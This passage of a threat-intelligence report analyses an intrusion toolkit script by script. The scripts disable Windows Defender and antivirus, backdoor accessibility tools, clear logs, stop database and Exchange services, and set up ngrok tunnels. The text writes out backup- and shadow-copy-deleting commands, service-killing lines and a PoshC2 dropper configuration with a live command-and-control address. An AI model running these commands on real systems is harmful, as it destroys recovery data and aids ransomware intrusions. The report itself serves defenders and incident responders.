+<h3 id="c01" class="wp-block-heading"><strong>atera_del.bat/atera_del2.bat</strong></h3>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37143" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_012.png" alt="" width="2208" height="1826" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The main goal of this batch file is to remove and uninstall Atera software, including the registry keys, services, and directories associated with Atera Agent installation. The exact commands observed in atera_del.bat have been seen in many public resources as a known way to uninstall/delete Atera from a system.</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://www.reddit.com/r/syncro/comments/pf85te/working_script_for_removing_atera_agent/" target="_blank" rel="noreferrer noopener">https://www.reddit.com/r/syncro/comments/pf85te/working_script_for_removing_atera_agent/</a></li>
+
+
+
+<li><a href="https://www.cliftonsystems.co.uk/atera-removal-script/" target="_blank" rel="noreferrer noopener">https://www.cliftonsystems.co.uk/atera-removal-script/</a></li>
+
+
+
+<li><a href="https://patrickdomingues.com/2022/01/19/how-to-uninstall-atera-agent-software/" target="_blank" rel="noreferrer noopener">https://patrickdomingues.com/2022/01/19/how-to-uninstall-atera-agent-software/</a></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The first line command is to silently uninstall the software associated with the given product code via msiexec, which in this case, is the product code dedicated to Atera. The command line parameter &#8220;/x&#8221; is used to uninstall a program, while the &#8220;/qn&#8221; means quiet mode to uninstall Atera silently without any prompts to the user.</p>
+
+
+
+<p class="wp-block-paragraph">The timeout command is used to ensure a slight pause (5 secs) after the uninstallation command is executed, possibly to allow for proper completion of the Atera uninstall process before proceeding to any subsequent commands in the batch file.</p>
+
+
+
+<p class="wp-block-paragraph">The sc command is also used, first to stop and then completely remove the AteraAgent service, all done silently without showing any output to the user with the help of &#8220;<em>&gt; nul 2&gt; nul</em>&#8221; commands.</p>
+
+
+
+<p class="wp-block-paragraph">The taskkill command is used to terminate a specific process, which in this case is the TicketingTray.exe. TicketingTray.exe is part of the AteraAgent software commonly used to display the Atera Icon on the system.</p>
+
+
+
+<p class="wp-block-paragraph">The REG command is used to force &#8220;<em>f</em>&#8221; delete the registry keys related to Atera Networks</p>
+
+
+
+<p class="wp-block-paragraph">RMDIR command silently and recursively deletes the &#8220;TrayIconCaching&#8221; directory in the current user&#8217;s local temporary files. &#8220;<em>/S</em>&#8221; removes all directories and files in the specified directory in addition to the directory itself, while &#8220;<em>/Q</em>&#8221; stands for &#8216;quiet mode&#8217; and does not prompt for confirmation.</p>
+
+
+
+<p class="wp-block-paragraph">The <em>RMDIR</em> command is used again to delete the installation folders of &#8220;ATERA Networks&#8221; from both the standard &#8220;Program Files&#8221; and &#8220;Program Files (x86)&#8221; directories.</p>
+
+
+
+<h3 id="c02" class="wp-block-heading"><strong>backup.bat</strong></h3>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37144" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_013.png" alt="" width="2280" height="634" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">These commands are intended to prevent data recovery, delete the volume shadow copies, and configure system boot settings, all making it more difficult to restore.</p>
+
+
+
+<p class="wp-block-paragraph">[W]badmin is a command-line utility for Windows backup and restore. The DELETE SYSTEMSTATEBACKUP arguments are used to delete system state backups. The flag-keepVersions:0 specifies that no versions of the system state backups should be kept, essentially deleting all existing system state backups. Next, the script runs wbadmin again. Similar to the previous command, this one is for deleting regular backups (not just system state backups).</p>
+
+
+
+<p class="wp-block-paragraph">[W]mic is another command-line utility used to interact with Windows Management Instrumentation (WMI) that can be used to delete volume shadow copies</p>
+
+
+
+<p class="wp-block-paragraph">The vssadmin command is used for the deletion of a specified volume&#8217;s shadow copies. In this case, it uses the &#8220;/All&#8217; parameter which deletes all shadow copies on the system. Shadow copies are used by Windows for backups and system restores. At the end the tool is used again to confirm shadow deletion.</p>
+
+
+
+<p class="wp-block-paragraph">[B]cdedit.exe is then used to disable WINDOWS automatic recovery features by modifying boot configuration data.</p>
+
+
+
+<h3 id="c03" class="wp-block-heading"><strong>clearlog.bat</strong></h3>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37145" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_014.png" alt="" width="1996" height="1266" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">This batch script checks if the user has administrative privileges and clears event logs in Windows. The IT community commonly uses portions of these commands, as seen in these posts in several IT forums many years ago.</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://answers.microsoft.com/en-us/windows/forum/all/clear-all-administratative-event-logs-in-event/17c5fba6-dc5e-4acd-9db0-e20665ce3ad5" target="_blank" rel="noreferrer noopener">https://answers.microsoft.com/en-us/windows/forum/all/clear-all-administratative-event-logs-in-event/17c5fba6-dc5e-4acd-9db0-e20665ce3ad5</a></li>
+
+
+
+<li><a href="https://www.get-itsolutions.com/commands-clean-recycle-bin/" target="_blank" rel="noreferrer noopener">https://www.get-itsolutions.com/commands-clean-recycle-bin/</a></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">Let&#8217;s break down each phase of the codes and discuss the functionalities of it.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37146" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_015.png" alt="" width="1599" height="212" /></a></p>
+
+
+
+
+
+<ul class="wp-block-list">
+<li>The @echo off command line hides the command execution output from the console itself while setting a timer for 60 seconds using the timeout /T 60</li>
+
+
+
+<li>FOR /F &#8220;tokens=1,2*&#8221; %%V IN (&#8216;bcdedit&#8217;) DO SET adminTest=%%V is a loop that iterates through the output of <em>bcdedit</em> command that shows boot configuration data and searches for lines containing:</li>
+
+
+
+<li>IF (%adminTest%)==(Access) goto noAdmin, this conditional statement checks if the admintest variable is equal to &#8220;Access&#8221;. If it is, the execution jumps to the noAdmin label, effectively skipping the log-clearing process.</li>
+</ul>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37147" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_016.png" alt="" width="1673" height="65" /></a></p>
+
+
+
+
+
+<ul class="wp-block-list">
+<li>This command has a loop that iterates through the output of wevtutil.exe el command, which lists event logs and, for each line, calls the :do_clear subroutine with the line&#8217;s content as an argument.</li>
+</ul>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37148" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_017.png" alt="" width="746" height="96" /></a></p>
+
+
+
+
+
+<ul class="wp-block-list">
+<li>The line echo clearing%1 prints a message indicating which event log is being cleared. The %1 placeholder is replaced by the actual log name passed from the main loop.</li>
+
+
+
+<li>[W]evtutil.exe cl %1 clears the specific event log identified by the %1 argument.</li>
+</ul>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37149" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_018.png" alt="" width="938" height="65" /></a></p>
+
+
+
+
+
+<ul class="wp-block-list">
+<li>This line of command clears out the $Recycle.bin directory from the system partition.</li>
+</ul>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37150" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_019.png" alt="" width="1996" height="159" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The above commands are used to delete the Remote Desktop Protocol traces found on the host artifacts. During our usual analysis, these are the artifacts that are commonly left by the threat actor for us to identify the RDP related activities as part of their lateral movement.</p>
+
+
+
+<ul class="wp-block-list">
+<li>These commands attempt to delete registry keys related to remote desktop settings under the current user&#8217;s profile, where the following options were used:</li>
+
+
+
+<li>/va: Deletes all values associated with the key</li>
+
+
+
+<li>/f: Forces the deletion, even if the key is protected</li>
+</ul>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37151" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_020.png" alt="" width="735" height="167" /></a></p>
+
+
+
+
+
+<ul class="wp-block-list">
+<li><em>cd %userprofile%\documents\ </em>this command will perform a change directory to the documents folder using the user profile where <em>default.rdp</em> is commonly stored. <em>Default.rdp</em> typically stores the settings for the RDP connections.. As <em>default.rdp</em> is a hidden file that is stored for each user, attrib <em>Default.rdp -s -h</em> needs to run (<em>&#8220;-s&#8221; </em>removes the &#8220;System&#8221; attribute from the file while &#8220;-h&#8221; removing the &#8220;hidden&#8221; attribute) for it to become visible. Once visible, the command del <em>Default.rdp </em>will execute the deletion of the file as part of the threat actor&#8217;s deletion of RDP traces.</li>
+</ul>
+
+
+
+<h3 id="c04" class="wp-block-heading"><strong>cmd.cmd</strong></h3>
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37152" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_021.png" alt="" width="3450" height="1250" /></a></p>
+
+
+
+<p class="wp-block-paragraph">The script above describes itself with its comments. The script is meant to disable User Account Control (UAC), backdoor the Sticky Keys, Utilman, and other accessibility features with <strong>cmd.exe</strong>, and disable <a href="https://www.elastic.co/guide/en/security/current/network-level-authentication-nla-disabled.html" target="_blank" rel="noreferrer noopener">Network Level Authentication (NLA)</a>.</p>
+
+
+
+<p class="wp-block-paragraph">Running this script would allow the threat actor to access the Windows sign-in screen without authentication and run commands using the backdoor accessibility tools in the system context.</p>
+
+
+
+<h3 id="c05" class="wp-block-heading"><strong>def1.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">The following batch script is another defense evasion script that provides several commands to disable Windows Defender.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37153" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_022.png" alt="" width="1277" height="993" /></a></p>
+
+
+
+
+
+<ol class="wp-block-list">
+<li>The first part of this script adds a dozen registry keys to disable several components of Windows Defender including Real-Time Protection, SpyNet, and MpEngine.</li>
+
+
+
+<li>The second section of the script tries to disable registry keys related to ETW tracing and logging.</li>
+
+
+
+<li>The third section disables multiple scheduled tasks related to Windows Defender.</li>
+
+
+
+<li>In the fourth area, the script works to remove various GUI access for Windows defender, particularly the system tray icon and the context menu access for things like on demand scanning.</li>
+
+
+
+<li>The fifth part of this script is using PowerShell to add the whole volumes (C:\, D:\, E:\, and F:\) as an <a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-extension-file-exclusions-microsoft-defender-antivirus?view=o365-worldwide" target="_blank" rel="noreferrer noopener">exclusion path</a> for Defender.</li>
+
+
+
+<li>The sixth part then sets registry values to disable various Windows Defender services.</li>
+</ol>
+
+
+
+<h3 id="c06" class="wp-block-heading"><strong>defendermalwar.bat</strong></h3>
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37154" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_023.png" alt="" width="2950" height="1352" /></a></p>
+
+
+
+<p class="wp-block-paragraph">This batch script executes several commands designed to disable various Windows Defender registry keys and alter User Account Control settings. WMIC command was also used in the last part of the script to uninstall Malwarebytes.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37155" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_024.png" alt="" width="2801" height="153" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The commands above were used to modify the registry key settings related to UAC on a Windows system. Let&#8217;s dissect each one of these:</p>
+
+
+
+<ul class="wp-block-list">
+<li>PromptOnSecureDesktop, setting this value to 0 disables the secure desktop when UAC prompts appear. Disabling this feature means UAC prompts will appear on the user&#8217;s current desktop, which could be less secure as some malware might interact with or spoof the UAC prompt.</li>
+
+
+
+<li>EnableLUA, setting this value to 1 enables Limited User Account (LUA) capabilities, the underlying technology for UAC.</li>
+
+
+
+<li>ConsentPromptBehaviorAdmin, setting this to 0 modifies the behavior of UAC prompts for administrative users. In this mode, when actions requiring administrative privileges are performed, the UAC prompt will not ask for consent (or credentials on standard user accounts)</li>
+</ul>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37156" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_025.png" alt="" width="2945" height="623" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">These commands collectively disable various Windows Defender security settings, including real-time protection and behavior monitoring.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37157" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_026.png" alt="" width="1623" height="159" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">These PowerShell commands remove the Windows Defender feature, forcefully restart the Windows Defender service, and forcefully restart the Windows Firewall service.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37158" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_027.png" alt="" width="1850" height="110" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The last part of the commands contain wmic (Windows Management Instrumentation Commandline) to silently uninstall any products whose names contain &#8216;Malwarebytes&#8217;.</p>
+
+
+
+<h3 id="c07" class="wp-block-heading"><strong>delbackup.bat</strong></h3>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37159" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_028.png" alt="" width="1924" height="1314" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Just like the other script (backup.bat), it primarily focuses on removing backup and system restore points from a Windows system, disabling recovery options, and modifying the boot configuration to ignore failures. It uses command-line utilities like wbadmin, wmic, vssadmin, and bcdedit to delete existing backups, shadow copies, and system state backups, and then alters the system&#8217;s boot settings to prevent automatic recovery actions in case of errors. Lines one through seven repeat the same actions observed in the prior discussed script.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37160" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_029.png" alt="" width="1915" height="379" /></a></figure>
+
+
+
+<ul class="wp-block-list">
+<li>cmd.exe /C wbadmin STOP job: Stops any backup jobs currently running.</li>
+
+
+
+<li>cmd.exe /C wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0 -quiet: Deletes all the backups of system files and settings without leaving any copies.</li>
+
+
+
+<li>cmd.exe /C wbadmin DELETE CATALOG -quiet: Removes the record of all backups so the system no longer knows they existed.</li>
+
+
+
+<li>cmd.exe /C wbadmin DISABLE backup: Turns off the backup schedule, so no more automatic backups will be made.</li>
+
+
+
+<li>cmd.exe /C bcdedit /set {default} recoveryenabled No and cmd.exe /C bcdedit /set {default} bootstatuspolicy ignoreallfailures: These commands make the computer ignore errors during startup and stop trying to fix them automatically.</li>
+</ul>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37161" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_030.png" alt="" width="983" height="435" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The last part of the script automates the deletion of all shadow copies (backup snapshots) on a Windows system and then removes itself. First, it changes the directory to the one containing the script, then, creates and executes a command sequence through diskshadow, to delete the shadow copies; and finally, deletes the command file and the script itself, after pausing for user input.</p>
+
+
+
+<h3 id="c08" class="wp-block-heading"><strong>disable.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This batch script contains 398 lines of code and can kill processes and disable multiple services including web servers, databases, and exchange services. Examples of commands used are:</p>
+
+
+
+<pre class="wp-block-preformatted">net stop MSExchangeDelivery
+sc config MSExchangeDelivery start= disabled
+net stop MSExchangeDiagnostics
+sc config MSExchangeDiagnostics start= disabled
+net stop MSExchangeEdgeSync
+taskkill -f -im sqlbrowser.exe
+taskkill -f -im sqlwriter.exe
+taskkill -f -im sqlservr.exe
+taskkill -f -im msmdsrv.exe
+taskkill -f -im MsDtsSrvr.exe
+</pre>
+
+
+
+<p class="wp-block-paragraph">The script also deletes many AV services, including Trend Micro, ESET, and Kaspersky:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37162" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_031.png" alt="" width="944" height="1730" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">Its noteworthy that the threat actor mistyped Delete (<strong>Delite</strong>) multiple times in the script comments, this could indicate that English may be a second language for this threat actor.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37163" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_032.png" alt="" width="388" height="155" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">An additional capability of this script, its disabling and deleting of Volume Shadow Copies (vssadmin.exe Delete Shadows /All /Quiet), suggests that it is meant to be used during ransomware attacks, to accelerate the encryption and prevent the victim from recovering the files. Similar scripts have been reported in a number of our ransomware reports.</p>
+
+
+
+<h3 id="c09" class="wp-block-heading"><strong>hyp.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">The name of this batch script suggests it is a Hyper-V-related tool. The script has more than 100 lines and starts with the following commands to delete Hyper-V services:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37164" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_033.png" alt="" width="772" height="686" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The script also deletes two services related to FireBird:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37165" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_034.png" alt="" width="1060" height="180" /></a></figure>
+
+
+
+<p class="wp-block-paragraph"><a href="https://firebirdsql.org/" target="_blank" rel="noreferrer noopener">Firebird</a> is an open-source SQL relational database system that offers high performance, scalability, and robust features.</p>
+
+
+
+<p class="wp-block-paragraph">The rest of the script overlaps with the files we&#8217;ve previously analyzed in this report, disabling different database services and killing their processes.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37166" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_035.png" alt="" width="1096" height="888" /></a></figure>
+<p>&nbsp;</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37167" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_036.png" alt="" width="1180" height="1696" /></a></figure>
+<p>&nbsp;</p>
+
+
+
+<h3 id="c10" class="wp-block-heading"><strong>LOGOFALL.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This script is one of the shortest scripts in the threat actor&#8217;s toolkit. It has a straightforward functionality:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37168" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_037.png" alt="" width="2010" height="226" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The query session command queries the current sessions on the system and saves the results to a text file. The batch script then iterates over the text files skipping the first line and extracting the session IDs from the 3 token (column). The sessions are then logged off using the session IDs obtained, and the text file is deleted.</p>
+
+
+
+<h3 id="c11" class="wp-block-heading"><strong>LOGOFALL1.bat</strong></h3>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37169" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_038.png" alt="" width="3052" height="382" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">This script is similar to LOGOFALL1.bat and serves the same objectives. This enhanced version logs off the users or sessions that didn&#8217;t meet the current condition only.</p>
+
+
+
+<p class="wp-block-paragraph">if /i &#8220;%%b&#8221;==&#8221;%username%&#8221; checks if the second token (session name) is equal to the current username (%username%). If the session name matches the current user, the session ID (%%c) is stored in the variable curID.</p>
+
+
+
+<p class="wp-block-paragraph">This following line for /L %%C in (0,1,20) do if &#8220;%%C&#8221; neq &#8220;%curID%&#8221; logoff %%C initiates a for /L loop that iterates from 0 to 20. For each value of %%C, it checks if the value does not equal to the current session ID stored in %curID%. If the session ID doesn&#8217;t match the current session ID, it logs off the session with the ID %%C.</p>
+
+
+
+<h3 id="c12" class="wp-block-heading"><strong>NG1.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This batch script contained three lines of <a href="https://ngrok.com/docs/agent/cli/" target="_blank" rel="noreferrer noopener">ngrok</a> configuration:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37170" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_039.png" alt="" width="2506" height="238" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">The ngrok config add-authtoken command saves the ngrok authtoken to the configuration file. While ngrok tcp can be used to start a TCP tunnel, which forwards all traffic on a public port to a local server (RDP in this case), it is also  extremely useful for exposing services that run non-HTTP traffic (SSH, SIP, RDP, RTSP, GRPC, game servers, etc).</p>
+
+
+
+<h3 id="c13" class="wp-block-heading"><strong>NG2.bat</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This script is similar to the first ngrok script NG1.bat. Only the authentication token differs:</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37171" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_040.png" alt="" width="2506" height="238" /></a></figure>
+<p>&nbsp;</p>
+
+
+
+<h3 id="c14" class="wp-block-heading"><strong>ngrok.exe</strong></h3>
+
+
+
+<p class="wp-block-paragraph">This binary is legitimate and signed <a href="https://www.virustotal.com/gui/file/1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386/detection" target="_blank" rel="noreferrer noopener">ngrok agent</a>.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37172" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_041.png" alt="" width="636" height="463" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">Some AV vendors tag it as malicious with a PUP category. The presence of this binary in your environment can be a great indicator of compromise if you are not using it.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37173" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_042.png" alt="" width="1830" height="1998" /></a></figure>
+<p>&nbsp;</p>
+
+
+
+<h3 id="c15" class="wp-block-heading"><strong>ON.bat</strong></h3>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37174" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_043.png" alt="" width="948" height="510" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">This type of command was used by Blackbyte, Promethus, Phobos and other ransomware groups as part of their playbook to perform configuration on several services. Aside from starting multiple services using net start command, below are the configuration changes using sc command</p>
+
+
+
+<p class="wp-block-paragraph"><em>sc.exe config Dnscache start= auto</em></p>
+
+
+
+<ul class="wp-block-list">
+<li>Caches DNS names and registers the full computer name for your computer</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">sc.exe config SSDPSRV start= auto</p>
+
+
+
+<ul class="wp-block-list">
+<li>Enables discovery of UPnP devices on your home network</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">sc.exe config FDResPub start= auto</p>
+
+
+
+<ul class="wp-block-list">
+<li>Publishes your computer and resources attached to your computer so they can be discovered over the network</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><em>sc.exe config upnphost start= auto</em></p>
+
+
+
+<ul class="wp-block-list">
+<li>Allows UPnP devices to be hosted on your computer</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong>References:</strong></p>
+
+
+
+<figure class="wp-block-embed">
+<div class="wp-block-embed__wrapper"><a href="https://www.linkedin.com/pulse/english-blackbyte-ransomware-misterious-dropper-encoder-fasolo">https://www.linkedin.com/pulse/english-blackbyte-ransomware-misterious-dropper-encoder-fasolo</a></div>
+</figure>
+
+
+
+<figure class="wp-block-embed">
+<div class="wp-block-embed__wrapper"><a href="https://www.cybereason.com/blog/research/cybereason-vs.-prometheus-ransomware">https://www.cybereason.com/blog/research/cybereason-vs.-prometheus-ransomware</a></div>
+</figure>
+
+
+
+<figure class="wp-block-embed">
+<div class="wp-block-embed__wrapper"><a href="https://blog.talosintelligence.com/understanding-the-phobos-affiliate-structure">https://blog.talosintelligence.com/understanding-the-phobos-affiliate-structure</a></div>
+<div> </div>
+</figure>
+<h3 id="c16" class="wp-block-heading"><strong>PoshC2</strong></h3>
+
+
+
+<p class="wp-block-paragraph">The Posh_v2_dropper_x64.exe is, as its name states, a <a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noreferrer noopener">PoshC2</a> dropper. Specifically, the sample is a C++ CLR (<a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="noreferrer noopener">Common Language Runtime</a>, a.k.a. .NET) loader which executes a PoshC2 PowerShell Dropper with the below reconstructed configuration.</p>
+
+
+
+<pre class="wp-block-preformatted">{
+  "ConnectURL": "/webhp/",
+  "Key": "bX7WACSlpm2NpvJdQbRV8DHAjmEJpKWM8n4bkG6bzCI=",
+  "KillDate": "2999-12-01",
+  "URLID": 1,
+  "PayloadCommsHost": "https://94.198.53.143",
+  "StageRetriesLimit": 30,
+  "StageRetries": true,
+  "StageRetriesInitialWait": 60,
+  "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"
+}
+</pre>
+
+
+
+<p class="wp-block-paragraph">The usage of the <a href="https://github.com/nettitude/PoshC2/blob/517903431ab43e6d714b24b0752ba111f5d4c2f1/resources/config-template.yml#L22" target="_blank" rel="noreferrer noopener">default kill date</a> and <a href="https://github.com/nettitude/PoshC2/blob/517903431ab43e6d714b24b0752ba111f5d4c2f1/poshc2/server/Config.py#L132-L137" target="_blank" rel="noreferrer noopener">TLS certificate</a> (besides all other tools and &#8220;geographic&#8221; location) are common indications of the C2 being adversary instead of red team infrastructure. At the time of writing, the Posh Command &amp; Control service is still actively responding.</p>
+
+
+
+<p class="wp-block-paragraph">Hunting for additional PoshC2 infrastructure can be done <a href="https://search.censys.io/search?resource=hosts&amp;q=services.tls.certificates.leaf_data.issuer.common_name%3A+%22P18055077%22" target="_blank" rel="noreferrer noopener">through the default TLS certificate settings</a>.</p>
+
+
+
+<h3 id="c17" class="wp-block-heading"><strong>native_dropper</strong></h3>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37175" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_044.png" alt="" width="3490" height="234" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">native_dropper is the Linux version of Posh_v2_dropper_x64.exe, which is the Windows version of it. By checking the hash of this file (<a href="https://www.virustotal.com/gui/file/63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d/details" target="_blank" rel="noreferrer noopener">63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d</a>), we can see that it is now flagged by most of the AV vendors as malicious with 58/72 ratings.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37176" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_045.png" alt="" width="3974" height="1918" /></a></figure>
+
+
+
